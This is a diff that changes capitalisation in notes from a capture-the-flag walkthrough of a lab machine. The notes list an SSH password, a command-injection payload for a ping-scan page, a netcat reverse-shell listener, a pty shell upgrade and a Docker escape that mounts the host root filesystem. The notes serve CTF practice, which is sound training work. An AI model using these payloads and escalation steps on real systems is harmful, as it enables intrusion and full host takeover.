@@ -68,21 +68,21 @@
 - `ssh 192.168.0.14 -l recon`
 	* pass: Security@hackNos
 - `docker run -it --privileged --name=ctf -v /:/host:rw alpine sh`
-- container: `cd /host`
+- Container: `cd /host`
 
 ---
 
 ## Bonus
 
 ### CLI 
-- configurate host/attacking machine network settings
-	* add a new network connection and manualy set it up:
+- Configurate host/attacking machine network settings
+	* Add a new network connection and manualy set it up:
 		- IP: 192.168.0.104
 		- Netmask: 255.255.255.0
 		- Gateway: 192.168.0.1
-		- connect to the network using the new interface
+		- Connect to the network using the new interface
 - `nc -lvp 4444` to initiate a listener on 4444
-- on 192.168.0.14/5ecure/index.php ping scan, run '|| python /var/opt/python.py' 
+- On 192.168.0.14/5ecure/index.php ping scan, run '|| python /var/opt/python.py' 
 - tty: `python -c 'import pty; pty.spawn("/bin/bash")'`
 - `getent group`: 
 	* `docker:x:119:`, passwd --> `recon:x:1000:119:rahul:/home/recon:/bin/bash`
